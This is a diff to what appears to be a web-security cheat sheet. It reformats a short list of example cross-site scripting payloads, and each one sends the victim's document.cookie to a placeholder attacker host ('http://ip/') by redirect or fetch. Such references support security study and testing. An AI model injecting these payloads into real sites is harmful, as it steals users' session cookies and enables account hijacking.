@@ -305,10 +305,12 @@ https://malwaredecoder.com/
 
 -> Examples
   
-`<script type="text/javascript">document.location="http://ip/?cookie="+document.cookie;</script>`  
-`<script>window.location="http://ip/?cookie="+document.cookie;</script>`  
-`<script>document.location="http://ip/?cookie="+document.cookie;</script>`  
-`<script>fetch('http://ip/?cookie=' + btoa(document.cookie));</script>`  
+```
+<script type="text/javascript">document.location="http://ip/?cookie="+document.cookie;</script>  
+<script>window.location="http://ip/?cookie="+document.cookie;</script>
+<script>document.location="http://ip/?cookie="+document.cookie;</script>  
+<script>fetch('http://ip/?cookie=' + btoa(document.cookie));</script>
+```
 
 ## Type Juggling and Hash Collision
 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf  
